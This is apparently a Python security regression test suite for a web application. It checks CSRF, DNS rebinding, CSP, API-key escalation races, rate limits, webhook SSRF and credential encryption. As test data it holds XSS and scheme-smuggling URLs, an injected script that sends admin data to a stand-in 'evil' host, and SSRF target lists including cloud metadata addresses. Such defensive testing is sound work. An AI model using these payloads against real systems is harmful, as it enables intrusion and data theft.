"""Security RE-AUDIT (HARDEN2 section A): attacks against every control that tests/test_security.py
covers, plus regressions for what the re-audit broke and fixed:

  - CSP hashed EVERY inline script in the response, so a script injected into a page was allowed too
    (accounts/security.py csp(): only hashes of our own templates' inline scripts are allowed now).
  - A child key could outlive a concurrently revoked parent (create/revoke race); create_key() did not
    re-check its parent (accounts/keys.py: parent locked + ancestors checked; revoke loops to a fixpoint).
  - ALERTS_WEBHOOK_ALLOW_PRIVATE turned the SSRF guard off on a deployed server (alerts/notifier.py).
  - Admin validation launches were rate-limited as cheap 'write' requests (accounts/ratelimit.py).

Run:  .venv/Scripts/python tests/test_security_reaudit.py
"""

import base64
import json
import logging
import os
import re
import socket
import subprocess
import sys
import threading
from datetime import datetime, timedelta, timezone
from pathlib import Path

os.environ["OPENGRID_NO_JOBS"] = "1"
os.environ["POLLER_ENABLED"] = "false"
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

import httpx  # noqa: E402
from cryptography.fernet import Fernet  # noqa: E402
from fastapi import HTTPException  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402
from sqlalchemy import text  # noqa: E402

import fixtures  # noqa: E402
import main  # noqa: E402
import normalize  # noqa: E402
import scratchdb  # noqa: E402
from accounts import accounts, credentials, keys, ratelimit, security  # noqa: E402
from alerts import notifier  # noqa: E402
from config import settings  # noqa: E402
from news import parse  # noqa: E402

DB = "og_test_secre"
client = TestClient(main.app, raise_server_exceptions=False)
HDR = {"X-OpenGrid-Request": "1"}
SAFE = ("GET", "HEAD", "OPTIONS")
_Session = None


def setup(password="pw"):
    global _Session
    if _Session is None:
        _Session = fixtures.session(scratchdb.create(DB))
    normalize.SessionLocal = _Session
    accounts.reset_cache()
    keys.reset_cache()
    ratelimit.reset()
    security.reset()
    settings.app_password = password
    settings.api_key_pepper = "test-pepper"
    settings.public_pages = False
    settings.trust_proxy_headers = False
    settings.environment = "development"
    settings.alerts_webhook_allow_private = False
    return _Session


def basic(user="opengrid", password="pw"):
    return {"Authorization": "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()}


def bearer(token):
    return {"Authorization": f"Bearer {token}"}


def all_routes():
    """(method, path template) of every route, including the ones inside included routers."""
    def walk(rs):
        for r in rs:
            if hasattr(r, "original_router"):
                yield from walk(r.original_router.routes)
            elif hasattr(r, "routes") and not hasattr(r, "methods") and not hasattr(r, "app"):
                yield from walk(r.routes)
            else:
                yield r
    out = set()
    for r in walk(main.app.routes):
        for m in getattr(r, "methods", None) or ():
            out.add((m, r.path))
    return sorted(out)


def fill(path):
    return re.sub(r"\{[^}]+\}", "1", path)


# ---------------------------------------------------------------- CSRF, every state-changing route

def test_csrf_every_route():
    setup()
    B = basic()
    unsafe = [(m, p) for m, p in all_routes() if m not in SAFE]
    assert len(unsafe) >= 40, f"route enumeration found only {len(unsafe)} state-changing routes"
    attacks = {
        "form, no header": {**B, "Content-Type": "application/x-www-form-urlencoded"},
        "text/plain, no header": {**B, "Content-Type": "text/plain"},
        "multipart, no header": {**B, "Content-Type": "multipart/form-data; boundary=x"},
        "json charset, no header": {**B, "Content-Type": "application/json; charset=utf-8"},
        "header=0": {**B, "X-OpenGrid-Request": "0"},
        "header=true": {**B, "X-OpenGrid-Request": "true"},
        "header + cross-site": {**B, **HDR, "Sec-Fetch-Site": "cross-site"},
        "header + same-site": {**B, **HDR, "Sec-Fetch-Site": "same-site"},
        "header + evil Origin": {**B, **HDR, "Origin": "https://evil.example"},
        "header + null Origin": {**B, **HDR, "Origin": "null"},
        "header + look-alike Origin": {**B, **HDR, "Origin": "http://testserver.evil.example"},
        "header + Origin other port": {**B, **HDR, "Origin": "http://testserver:8443"},
    }
    failures = []
    for m, p in unsafe:
        path = fill(p)
        for name, h in attacks.items():
            r = client.request(m, path, headers=h, content=b"a=b")
            if r.status_code != 403 or "cross-site" not in r.text:
                failures.append((name, m, p, r.status_code))
    assert not failures, failures[:20]
    # open local dev (no password) is the same ambient principal
    settings.app_password = None
    try:
        for m, p in unsafe:
            r = client.request(m, fill(p), headers={"Content-Type": "text/plain"}, content=b"x")
            if r.status_code != 403:
                failures.append(("open dev", m, p, r.status_code))
    finally:
        settings.app_password = "pw"
    assert not failures, failures[:20]
    # what passes CSRF (header + same origin) reaches the handler (anything but the CSRF 403)
    r = client.post("/v1/admin/keys/999999/revoke", headers={**B, **HDR, "Origin": "http://testserver",
                                                              "Sec-Fetch-Site": "same-origin"})
    assert r.status_code == 404, r.text
    # method tricks: no override header / _method param is honoured, HEAD/OPTIONS on a POST route are 405
    for h in ({"X-HTTP-Method-Override": "POST"}, {"X-Method-Override": "POST"}):
        assert client.get("/normalize?_method=POST", headers={**B, **h}).status_code == 405
    assert client.head("/normalize", headers=B).status_code == 405
    assert client.options("/normalize", headers=B).status_code == 405
    # path variants of a state-changing route never dodge the check
    for path in ["/V1/keys", "/v1/keys/", "//v1/keys", "/v1//keys", "/v1/./keys", "/normalize/", "/NORMALIZE"]:
        r = client.post(path, headers=B, json={"name": "x"})
        assert r.status_code in (403, 404, 405), (path, r.status_code)
        assert r.status_code != 201


def test_open_dev_refuses_dns_rebinding():
    """No APP_PASSWORD (a developer machine): a rebinding page is same-origin with itself, so Origin/Host
    checks pass; only the Host name it must send gives it away."""
    setup()
    settings.app_password = None
    try:
        evil = {"Host": "evil.example", "Origin": "http://evil.example", "Sec-Fetch-Site": "same-origin", **HDR}
        assert client.post("/v1/keys", headers=evil, json={"name": "x"}).status_code == 403
        assert client.get("/v1/credentials", headers={"Host": "evil.example"}).status_code == 403
        assert client.get("/raw", headers={"Host": "evil.example:8000"}).status_code == 403
        assert client.get("/v1/me", headers={"Host": "127.0.0.1.evil.example"}).status_code == 403
        for host in ("localhost:8000", "127.0.0.1:8000", "[::1]:8000", "192.168.1.20", "app.localhost", "testserver"):
            assert client.get("/v1/me", headers={"Host": host}).status_code == 200, host
        # an API key is not ambient: unaffected
        a = accounts.create_account("rebind")
        k = keys.create_key(a["id"], "k", ["data:read"])
        assert client.get("/v1/me", headers={"Host": "evil.example", **bearer(k["secret"])}).status_code == 200
    finally:
        settings.app_password = "pw"


def test_bearer_exemption_not_abusable():
    setup()
    B = basic()
    failures = []
    for m, p in all_routes():
        if not p.startswith("/v1/") or p == "/v1/events/track":  # anonymous product analytics, by design
            continue
        for h in ({"Authorization": "Bearer garbage"}, {"Authorization": "Bearer opg_live_" + "A" * 43},
                  {"Authorization": "bEaReR opg_x"}, {"Authorization": "Bearer "}):
            r = client.request(m, fill(p), headers={**h, **HDR})
            if r.status_code not in (401, 404, 405):  # 404/405: no such concrete path (e.g. a page)
                failures.append((m, p, h["Authorization"][:12], r.status_code))
    assert not failures, failures[:20]
    # garbage Bearer FIRST and the valid site login second: the first header decides, and it is a bad key
    r = client.post("/v1/admin/keys/1/revoke", headers=[("authorization", "Bearer garbage"),
                                                        ("authorization", B["Authorization"])])
    assert r.status_code == 401, r.status_code
    # site login first, bearer second: the operator path, so CSRF applies
    r = client.post("/v1/admin/keys/1/revoke", headers=[("authorization", B["Authorization"]),
                                                        ("authorization", "Bearer garbage")])
    assert r.status_code == 403, r.status_code
    # Bearer on a non-/v1 path does not get past the site password
    for path in ("/fetch", "/normalize"):
        assert client.post(path, headers={"Authorization": "Bearer opg_live_x", **HDR}).status_code == 401
    assert client.get("/raw", headers={"Authorization": "Bearer opg_live_x"}).status_code == 401


# ---------------------------------------------------------------- safe URLs (server + web client)

BAD_URLS = ["javascript:alert(1)", "JaVaScRiPt:alert(1)", "java\tscript:alert(1)", "java\nscript:x",
            "java\rscript:x", " javascript:x", "\x00javascript:x", "\x01javascript:x", "\x1fjavascript:x",
            " javascript:x", "﻿javascript:x", "&#x6A;avascript:alert(1)", "&#106;avascript:x",
            "data:text/html,<script>alert(1)</script>", "DATA:text/html,x", "vbscript:msgbox(1)",
            "//evil.com", "\\\\evil.com", "/\\evil.com", "http:/evil", "https:evil.com", "http:\\\\evil.com",
            "file:///etc/passwd", "ftp://evil.com/", "jar:http://x!/", "view-source:http://x",
            "javascript://%0aalert(1)", "", "   ", None, 7, "https://"]


def test_safe_url_server():
    for u in BAD_URLS:
        assert parse.safe_url(u) is None, repr(u)
    for u in ["https://ok.example/a?b=1#c", "http://ok.example", "HTTPS://OK.EXAMPLE/x"]:
        assert parse.safe_url(u) == u, u
    assert parse.safe_url("  https://ok.example/a \n") == "https://ok.example/a"
    # end to end: a feed with every bad link stores no link at all
    items = "".join(f"<item><title>t{i}</title><link>{_xml(u)}</link></item>"
                    for i, u in enumerate(BAD_URLS) if isinstance(u, str) and u.strip())
    got = [i["url"] for i in parse.parse_xml(f"<rss><channel>{items}</channel></rss>")]
    assert got and all(u is None for u in got), got


def _xml(s):
    return "".join(c if c.isprintable() and c not in "<&" else f"&#{ord(c)};" for c in s if ord(c) >= 0x20 or
                   c in "\t\n\r")


def _node(js: str):
    out = subprocess.run(["node", "-e", js], cwd=str(ROOT), capture_output=True, text=True, timeout=60)
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


def test_safe_url_web_client():
    """OG.safeUrl must turn every script-capable scheme into '#', and whatever it lets through must
    parse (WHATWG URL, as a browser does) to an http(s)/mailto URL or a same-origin relative one."""
    vals = [u for u in BAD_URLS if isinstance(u, str)] + ["https://ok/a", "/gpu/x", "#a", "?q=1", "mailto:a@b.c",
                                                          "jav&#x09;ascript:alert(1)", "java\u0000script:x",
                                                          " javascript:x", "javascript\t:x"]
    js = ("const OG=require('./web/core.js');const v=" + json.dumps(vals) + ";"
          "process.stdout.write(JSON.stringify(v.map(x=>{const s=OG.safeUrl(x);let p=null;"
          "try{p=new URL(s,'https://og.example/base/').protocol}catch(e){p='invalid'}return [s,p]})))")
    out = _node(js)
    for (raw, (s, proto)) in zip(vals, out):
        assert proto in ("https:", "http:", "mailto:", "invalid"), (raw, s, proto)
        if re.sub(r"[\x00-\x20\x7f]", "", raw.strip()).lower().startswith(("javascript:", "data:", "vbscript:")):
            assert s == "#", (raw, s)
    # OG.go refuses non-http(s) targets (it is the only programmatic navigation in core.js)
    src = (ROOT / "web" / "core.js").read_text(encoding="utf-8")
    assert re.search(r"OG\.go = \(url, opts\) => \{\s*const u = new URL\(url, location\.href\);\s*"
                     r"if \(!/\^https\?:\$/\.test\(u\.protocol\)\) return;", src), "OG.go guard missing"
    assert "window.open(safeUrl(" in src
    # every URL-valued attribute goes through safeUrl in OG.h and OG.s
    for attr in ("href", "src", "action", "formaction", "xlink:href", "srcdoc", "poster", "data"):
        assert f'"{attr}"' in src.split("const URL_ATTRS", 1)[1].split("\n", 1)[0], attr
    # no server-side redirects exist that could be an open redirect
    for f in list(ROOT.glob("*.py")) + list((ROOT / "api").glob("*.py")) + list((ROOT / "accounts").glob("*.py")):
        assert "RedirectResponse" not in f.read_text(encoding="utf-8"), f


# ---------------------------------------------------------------- CSP

def test_csp_does_not_allow_injected_inline_script():
    setup()
    r = client.get("/", headers=basic())
    csp = r.headers["content-security-policy"]
    own = re.findall(r"<script>(.*?)</script>", r.text, re.S)
    assert own and all(security.inline_script_hashes(f"<script>{s}</script>")[0] in csp for s in own)
    injected = "<script>fetch('/v1/admin/accounts').then(r=>r.text()).then(t=>new Image().src='//evil/'+t)</script>"
    evil_hash = security.inline_script_hashes(injected)[0]
    page = r.text.replace("</body>", injected + "</body>")
    assert evil_hash not in security.csp("/gpu/h100", page), "an injected inline script must not be hash-allowed"
    assert evil_hash not in security.csp("/", injected)
    # the policy forbids inline script otherwise, plugins, framing, base hijack, foreign form targets
    parts = dict(p.strip().split(" ", 1) for p in csp.split(";") if p.strip())
    assert "'unsafe-inline'" not in parts["script-src"] and "'unsafe-eval'" not in parts["script-src"]
    assert "*" not in parts["script-src"] and "data:" not in parts["script-src"]
    assert parts["object-src"] == "'none'" and parts["frame-ancestors"] == "'none'" and parts["base-uri"] == "'self'"
    assert parts["form-action"] == "'self'"
    # the classic page's own big inline script is allowed (it comes from our template)
    rc = client.get("/classic", headers=basic())
    own_c = re.findall(r"<script>(.*?)</script>", rc.text, re.S)
    assert own_c and security.inline_script_hashes(f"<script>{own_c[0]}</script>")[0] in \
        rc.headers["content-security-policy"]


def test_security_headers_everywhere():
    setup()
    settings.public_pages = True
    try:
        cases = [("/", basic()), ("/v1/me", basic()), ("/static/core.js", {}), ("/static/app.css", {}),
                 ("/robots.txt", {}), ("/nonexistent-zzz", basic()), ("/v1/me", {}),  # 401 JSON
                 ("/v1/me", bearer("garbage")), ("/docs", basic()), ("/openapi.json", basic())]
        for path, h in cases:
            r = client.get(path, headers=h)
            for k, v in security.COMMON_HEADERS.items():
                assert r.headers.get(k) == v, (path, r.status_code, k, r.headers.get(k))
            if r.headers.get("content-type", "").startswith("text/html"):
                assert "frame-ancestors 'none'" in r.headers.get("content-security-policy", ""), path
        # a CSRF refusal and a login lockout carry them too
        r = client.post("/normalize", headers=basic())
        assert r.status_code == 403 and r.headers.get("x-frame-options") == "DENY"
    finally:
        settings.public_pages = False


# ---------------------------------------------------------------- API keys

def _mgr(name, **kw):
    a = accounts.create_account(name)
    k = keys.create_key(a["id"], "mgr", ["data:read", "account:manage", "keys:read"], **kw)
    return a, k


def test_key_inheritance_and_escalation():
    setup()
    exp = datetime.now(timezone.utc) + timedelta(days=1)
    a, k = _mgr("inherit", rate_limit_per_minute=7, expires_at=exp)
    H = bearer(k["secret"])
    for body, why in [({"scopes": ["data:read", "route:execute"]}, "extra scope"),
                      ({"scopes": ["admin"]}, "admin"),
                      ({"scopes": ["*"]}, "star"),
                      ({"rate_limit_per_minute": 8}, "higher limit"),
                      ({"platform_admin": True}, "platform admin")]:
        r = client.post("/v1/keys", headers=H, json=body)
        assert r.status_code in (400, 403), (why, r.status_code, r.text)
    r = client.post("/v1/keys", headers=H, json={"name": "kid", "scopes": ["data:read"], "expires_in_days": 3650})
    kid = r.json()["data"]
    assert r.status_code == 201 and kid["rate_limit_per_minute"] == 7
    assert datetime.fromisoformat(kid["expires_at"]) <= exp
    # a child cannot exceed its creator through the admin route either (account:manage is not admin)
    assert client.post(f"/v1/admin/accounts/{a['id']}/keys", headers=H, json={}).status_code == 403
    # a key without an explicit limit: children default to (and are capped by) the default
    _, k2 = _mgr("inherit2")
    r = client.post("/v1/keys", headers=bearer(k2["secret"]),
                    json={"rate_limit_per_minute": settings.rate_limit_read_per_minute + 1})
    assert r.status_code == 403
    # a stored "*" or admin scope on a non-platform key grants nothing extra
    with _Session.begin() as s:
        s.execute(text("UPDATE api_keys SET scopes = ARRAY['*', 'admin', 'data:read'] WHERE id = :i"),
                  {"i": kid["id"]})
    me = client.get("/v1/me", headers=bearer(kid["secret"])).json()["data"]
    assert me["scopes"] == ["data:read"], me["scopes"]
    assert client.get("/v1/admin/accounts", headers=bearer(kid["secret"])).status_code == 403


def test_revoked_parent_cannot_have_live_children():
    setup()
    a, k = _mgr("lineage")
    kid = keys.create_key(a["id"], "kid", ["data:read", "account:manage"], parent_key_id=k["id"])
    keys.revoke_key(k["id"])
    # a creation that was authorised before the revocation but inserts after it is refused
    for parent in (k["id"], kid["id"]):  # the parent itself, and a (cascade-revoked) descendant
        try:
            keys.create_key(a["id"], "late", ["data:read"], parent_key_id=parent)
            raise AssertionError(f"created a key under revoked key {parent}")
        except ValueError:
            pass
    # an ancestor revoked without the cascade reaching the child (e.g. lineage written later): refused too
    _, root = _mgr("lineage2")
    acct = root["account_id"]
    mid = keys.create_key(acct, "mid", ["data:read", "account:manage"], parent_key_id=root["id"])
    with _Session.begin() as s:
        s.execute(text("UPDATE api_keys SET revoked_at = now() WHERE id = :i"), {"i": root["id"]})
    try:
        keys.create_key(acct, "late2", ["data:read"], parent_key_id=mid["id"])
        raise AssertionError("created a key below a revoked ancestor")
    except ValueError:
        pass


def test_revoke_create_race():
    """Threads keep creating children of P (and grandchildren) while P's root is revoked. Afterwards
    no key below the root may be active."""
    setup()
    old = settings.max_keys_per_account
    settings.max_keys_per_account = 10_000
    try:
        a, root = _mgr("race")
        acct = a["id"]
        p = keys.create_key(acct, "p", ["data:read", "account:manage"], parent_key_id=root["id"])
        stop = threading.Event()
        made, errors = [], []

        def creator(parent):
            while not stop.is_set():
                try:
                    made.append(keys.create_key(acct, "c", ["data:read", "account:manage"], parent_key_id=parent)["id"])
                except ValueError:
                    return  # parent revoked: correct
                except Exception as e:  # noqa: BLE001
                    errors.append(repr(e))
                    return

        ts = [threading.Thread(target=creator, args=(pid,)) for pid in (root["id"], p["id"], p["id"])]
        for t in ts:
            t.start()
        import time
        time.sleep(0.4)
        keys.revoke_key(root["id"])
        stop.set()
        for t in ts:
            t.join(30)
        assert not errors, errors[:3]
        assert made, "the creators never ran"
        with _Session() as s:
            alive = s.execute(text("""
                WITH RECURSIVE d(id) AS (SELECT key_id FROM api_key_lineage WHERE parent_key_id = :r
                    UNION SELECT l.key_id FROM api_key_lineage l JOIN d ON l.parent_key_id = d.id)
                SELECT count(*) FROM d JOIN api_keys k ON k.id = d.id WHERE k.revoked_at IS NULL"""),
                {"r": root["id"]}).scalar()
        assert alive == 0, f"{alive} keys survived the revocation of their root"
    finally:
        settings.max_keys_per_account = old


def test_key_cap_under_concurrency():
    setup()
    old = settings.max_keys_per_account
    settings.max_keys_per_account = 5
    try:
        a = accounts.create_account("capconc")
        m = keys.create_key(a["id"], "m", ["data:read", "account:manage"])
        H = bearer(m["secret"])
        codes = []
        barrier = threading.Barrier(12)

        def go(i):
            barrier.wait()
            codes.append(TestClient(main.app).post("/v1/keys", headers=H, json={"name": f"t{i}"}).status_code)

        ts = [threading.Thread(target=go, args=(i,)) for i in range(12)]
        for t in ts:
            t.start()
        for t in ts:
            t.join(60)
        assert keys.active_key_count(_Session(), a["id"]) == 5, codes
        assert codes.count(201) == 4 and codes.count(409) == 8, codes
        # revoke-and-recreate churn does not exceed the cap either, and does not reset the account budget
    finally:
        settings.max_keys_per_account = old


def test_account_rate_limit_concurrency_and_churn():
    setup()
    old = settings.account_rate_limit_read_per_minute
    settings.account_rate_limit_read_per_minute = 20
    t = [5000.0]
    ratelimit.clock = lambda: t[0]
    try:
        a, m = _mgr("rl")
        ks = [keys.create_key(a["id"], f"k{i}", ["data:read"], rate_limit_per_minute=1000) for i in range(4)]
        codes = []
        lock = threading.Lock()

        def hit(sec):
            c = TestClient(main.app)
            for _ in range(10):
                code = c.get("/v1/scopes", headers={**bearer(sec), "X-Forwarded-For": f"1.2.3.{len(codes)}"}).status_code
                with lock:
                    codes.append(code)

        ts = [threading.Thread(target=hit, args=(k["secret"],)) for k in ks]
        for th in ts:
            th.start()
        for th in ts:
            th.join(60)
        assert codes.count(200) == 20 and codes.count(429) == 20, (codes.count(200), codes.count(429))
        # key churn: a brand-new key of the same account starts with the account's EMPTY bucket
        fresh = keys.create_key(a["id"], "fresh", ["data:read"])
        r = client.get("/v1/scopes", headers=bearer(fresh["secret"]))
        assert r.status_code == 429 and r.headers.get("Retry-After"), r.status_code
        # path variants do not change the class: /v1/route/ and /v1/route/preview are execute
        assert ratelimit.request_class("POST", "/v1/route/") == "execute"
        assert ratelimit.request_class("POST", "/v1/route/preview") == "execute"
        assert ratelimit.request_class("POST", "/v1/deployments/dep_x/terminate") == "write", "shutdown is never throttled like a launch"
        assert ratelimit.request_class("POST", "/v1/admin/execution/validation") == "execute"
        assert ratelimit.request_class("POST", "/v1/admin/validation/start") == "execute"
        assert ratelimit.request_class("OPTIONS", "/v1/route") == "read"
    finally:
        ratelimit.clock = __import__("time").monotonic
        settings.account_rate_limit_read_per_minute = old


def test_public_limit_not_bypassed_by_xff():
    setup()
    settings.public_pages = True
    old = settings.public_rate_limit_per_minute
    settings.public_rate_limit_per_minute = 4
    try:
        codes = [client.get("/robots.txt", headers={"X-Forwarded-For": f"9.9.9.{i}", "X-Real-IP": f"8.8.8.{i}"})
                 .status_code for i in range(8)]
        assert codes.count(200) == 4, codes
        # a wrong site password does not turn into an unlimited anonymous pass either
        codes = [client.get("/robots.txt", headers=basic(password=f"wrong{i}")).status_code for i in range(3)]
        assert all(c == 429 for c in codes), codes
    finally:
        settings.public_pages = False
        settings.public_rate_limit_per_minute = old


# ---------------------------------------------------------------- login throttle

def test_login_throttle_attacks():
    setup()
    n = settings.login_max_failures
    for i in range(n):
        h = {**basic(password=f"x{i}"), "X-Forwarded-For": f"7.7.7.{i}"}
        assert client.get("/v1/me", headers=h).status_code == 401
    # rotating X-Forwarded-For does not reset the counter while proxy headers are not trusted
    r = client.get("/v1/me", headers={**basic(), "X-Forwarded-For": "1.1.1.1"})
    assert r.status_code == 429 and int(r.headers["Retry-After"]) > 0
    assert int(r.headers["Retry-After"]) <= settings.login_failure_window_seconds + 1
    # nor does a different user name, a POST, or a non-/v1 path
    assert client.get("/", headers=basic(user="other")).status_code == 429
    assert client.post("/normalize", headers={**basic(), **HDR}).status_code == 429
    # with trusted proxies, the right-most hop is the client: a spoofed left-most hop changes nothing
    security.reset()
    settings.trust_proxy_headers = True
    try:
        for i in range(n):
            client.get("/v1/me", headers={**basic(password="no"), "X-Forwarded-For": f"6.6.6.{i}, 203.0.113.5"})
        r = client.get("/v1/me", headers={**basic(), "X-Forwarded-For": "6.6.6.99, 203.0.113.5"})
        assert r.status_code == 429
        r = client.get("/v1/me", headers={**basic(), "X-Forwarded-For": "203.0.113.6"})
        assert r.status_code == 200, "another real client is not locked out"
    finally:
        settings.trust_proxy_headers = False
        security.reset()


# ---------------------------------------------------------------- admin API authorization

def test_admin_routes_require_platform_admin():
    setup()
    a = accounts.create_account("adm-probe")
    everything = [s for s in __import__("accounts.auth", fromlist=["SCOPES"]).SCOPES]
    plain = keys.create_key(a["id"], "all-scopes-no-flag", everything)
    mgr = keys.create_key(a["id"], "mgr", ["account:manage", "data:read"])
    admin_routes = [(m, p) for m, p in all_routes() if "/admin" in p and p.startswith("/v1/")]
    assert len(admin_routes) >= 20, admin_routes
    bad = []
    for m, p in admin_routes:
        for k in (plain, mgr):
            r = client.request(m, fill(p), headers={**bearer(k["secret"]), "Content-Type": "application/json"},
                               content=b"{}")
            if r.status_code != 403:
                bad.append((m, p, k["name"], r.status_code))
    assert not bad, bad[:20]
    # ops / raw / fetch (operator functions outside /v1/admin) are not reachable by a key either
    for m, p in [("POST", "/v1/ops/quarantine/1/accept"), ("POST", "/v1/news/refresh"),
                 ("POST", "/v1/admin/execution/kill")]:
        assert client.request(m, p, headers=bearer(plain["secret"])).status_code == 403, p


# ---------------------------------------------------------------- webhook SSRF

def _fake_dns(table):
    def gai(host, port):
        ips = table.get(host)
        if ips is None:
            raise socket.gaierror("nx")
        return [((socket.AF_INET6 if ":" in ip else socket.AF_INET), socket.SOCK_STREAM, 6, "", (ip, port))
                for ip in ips]
    return gai


def test_webhook_ssrf_matrix():
    blocked = ["0.0.0.0", "0.1.2.3", "127.0.0.1", "127.255.255.254", "10.1.2.3", "172.31.255.255", "192.168.0.1",
               "169.254.169.254", "100.64.0.1", "100.127.255.255", "192.0.0.1", "192.0.2.1", "198.18.0.1",
               "198.51.100.1", "203.0.113.1", "224.0.0.251", "239.255.255.250", "240.0.0.1", "255.255.255.255",
               "::", "::1", "fe80::1", "fe80::1%1", "fc00::1", "fd12:3456::1", "ff02::1", "::ffff:127.0.0.1",
               "::ffff:10.0.0.1", "::ffff:169.254.169.254", "::127.0.0.1", "2002:7f00:0001::1", "2002:0a00:0001::",
               "2001:0:4136:e378:8000:63bf:3fff:fdd2", "64:ff9b::7f00:1", "64:ff9b:1::1", "2001:db8::1", "100::1",
               "::ffff:0:127.0.0.1"]
    bad = [ip for ip in blocked if not notifier.blocked_ip(ip.split("%")[0])]
    assert not bad, bad
    assert not notifier.blocked_ip("8.8.8.8") and not notifier.blocked_ip("2606:4700:4700::1111")
    real = notifier.getaddrinfo
    try:
        # numeric host encodings are judged by what they RESOLVE to (the real resolver decodes them)
        for url in ["https://2130706433/", "https://0x7f000001/", "https://0x7f.1/", "https://017700000001/",
                    "https://127.1/", "https://0/", "https://[::ffff:7f00:1]/", "https://[::1]/",
                    "https://[fe80::1%25eth0]/", "https://localhost/", "https://127.0.0.1.:443/"]:
            try:
                notifier.check_url(url)
                raise AssertionError(f"accepted {url}")
            except ValueError:
                pass
        notifier.getaddrinfo = _fake_dns({"evil.example": ["93.184.215.14", "10.0.0.5"],  # one private answer
                                          "pub.example": ["93.184.215.14"], "v6.example": ["fd00::1"],
                                          "xn--exmple-cua.example": ["127.0.0.1"]})
        for url in ["https://evil.example/x", "https://v6.example/", "http://pub.example/", "ftp://pub.example/",
                    "https://user@pub.example/", "https://user:pw@pub.example/", "https://evil@127.0.0.1/",
                    "https://pub.example\\@127.0.0.1/", "https://127.0.0.1\\@pub.example/", "//pub.example/",
                    "https:pub.example", "https://xn--exmple-cua.example/", "https://exämple.example/", ""]:
            try:
                notifier.check_url(url)
                raise AssertionError(f"accepted {url}")
            except ValueError:
                pass
        assert notifier.check_url("https://pub.example/hook") == "https://pub.example/hook"
    finally:
        notifier.getaddrinfo = real


def test_webhook_delivery_attacks():
    real_gai, real_client = notifier.getaddrinfo, notifier.http_client
    seen = []
    consumed = {"n": 0}

    def big_body():
        for _ in range(10_000):
            consumed["n"] += 1
            yield b"x" * 65536

    def handler(request):
        seen.append(request)
        if request.url.path == "/redirect":
            return httpx.Response(302, headers={"Location": "http://127.0.0.1:8080/admin"})
        if request.url.path == "/big":
            return httpx.Response(200, content=big_body())
        return httpx.Response(204)

    notifier.http_client = lambda: httpx.Client(transport=httpx.MockTransport(handler), follow_redirects=False)
    try:
        # the real client: no redirects, no proxies from the environment, bounded timeouts
        c = real_client()
        assert c.follow_redirects is False and c.timeout.connect <= 3 and c.timeout.read <= 5
        assert c._trust_env is False
        c.close()
        # DNS rebinding: public at rule creation, private at delivery -> no connection at all
        answers = iter([["93.184.215.14"], ["127.0.0.1"], ["127.0.0.1"]])
        notifier.getaddrinfo = lambda h, p: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, p)) for ip in next(answers)]
        ch = notifier.validate_channels([{"type": "webhook", "url": "https://rebind.example/hook"}])
        via, st = notifier.deliver(ch[1:], {"a": 1}, "whsec_x")
        assert not seen and st["webhook"] == "delivery_failed", (seen, st)
        # redirect to a private address is not followed
        notifier.getaddrinfo = _fake_dns({"pub.example": ["93.184.215.14"]})
        via, st = notifier.deliver([{"type": "webhook", "url": "https://pub.example/redirect"}], {}, "whsec_x")
        assert len(seen) == 1 and st["webhook"] == "delivery_failed"
        assert seen[0].url.host == "93.184.215.14" and seen[0].headers["host"] == "pub.example"
        # a huge response body is never read
        via, st = notifier.deliver([{"type": "webhook", "url": "https://pub.example/big"}], {}, "whsec_x")
        assert st["webhook"] == "ok" and consumed["n"] <= 1, consumed
        # a non-default port is pinned too (the Host header keeps it)
        notifier.deliver([{"type": "webhook", "url": "https://pub.example:8443/p"}], {}, "whsec_x")
        assert seen[-1].url.port == 8443 and seen[-1].url.host == "93.184.215.14"
        assert seen[-1].headers["host"] == "pub.example:8443"
        # a stored rule whose URL was edited in the DB to a private literal: refused at delivery
        n = len(seen)
        for url in ["https://127.0.0.1/", "https://[::ffff:127.0.0.1]/", "http://pub.example/", "https://u@pub.example/"]:
            _, st = notifier.deliver([{"type": "webhook", "url": url}], {}, "whsec_x")
            assert st["webhook"] == "delivery_failed", url
        assert len(seen) == n
        # ALERTS_WEBHOOK_ALLOW_PRIVATE is ignored once deployed (it would be an SSRF switch in production)
        settings.alerts_webhook_allow_private = True
        settings.environment = "production"
        try:
            try:
                notifier.check_url("https://127.0.0.1/")
                raise AssertionError("allow_private honoured on a deployed server")
            except ValueError:
                pass
            _, st = notifier.deliver([{"type": "webhook", "url": "https://127.0.0.1/"}], {}, "whsec_x")
            assert st["webhook"] == "delivery_failed" and len(seen) == n
        finally:
            settings.environment = "development"
            settings.alerts_webhook_allow_private = False
    finally:
        notifier.getaddrinfo, notifier.http_client = real_gai, real_client


def test_ops_alert_webhook_uses_the_same_guard():
    setup()
    from alerts import ops

    real_gai, real_client = notifier.getaddrinfo, notifier.http_client
    seen = []
    notifier.http_client = lambda: httpx.Client(transport=httpx.MockTransport(lambda r: seen.append(r) or
                                                                              httpx.Response(204)))
    saved = (settings.ops_alert_webhook_url, settings.ops_alert_webhook_secret)
    try:
        settings.ops_alert_webhook_url, settings.ops_alert_webhook_secret = "https://ops.example/hook", "whsec_ops"
        notifier.getaddrinfo = _fake_dns({"ops.example": ["169.254.169.254"]})
        out = ops.alert("termination_failed", "probe", detail={"deployment_id": "d", "provider": "p",
                                                               "account_id": 1, "est_hourly_exposure_usd": 1,
                                                               "time_in_state": "1m", "suggested_action": "x"})
        assert out["delivered"] is False and not seen, (out, seen)
        notifier.getaddrinfo = _fake_dns({"ops.example": ["93.184.215.14"]})
        out = ops.alert("termination_failed", "probe2", detail={})
        assert out["delivered"] is True and seen[-1].url.host == "93.184.215.14"
    finally:
        settings.ops_alert_webhook_url, settings.ops_alert_webhook_secret = saved
        notifier.getaddrinfo, notifier.http_client = real_gai, real_client


# ---------------------------------------------------------------- credential encryption

def test_credential_encryption_fail_closed():
    S = setup()
    saved = (settings.credentials_encryption_key, settings.credentials_encryption_keys_old, settings.runpod_api_key)
    k1, k2 = Fernet.generate_key().decode(), Fernet.generate_key().decode()
    try:
        # deployed: missing key, passphrase, malformed key, and a passphrase as an OLD key are all refused
        settings.environment = "production"
        for key, old in [(None, None), ("correct horse battery staple", None), ("A" * 44, None), (k1, "a passphrase")]:
            settings.credentials_encryption_key, settings.credentials_encryption_keys_old = key, old
            try:
                credentials.encrypt("x")
                raise AssertionError(f"encrypt accepted key={key!r} old={old!r} when deployed")
            except HTTPException as e:
                assert e.status_code == 503
            try:
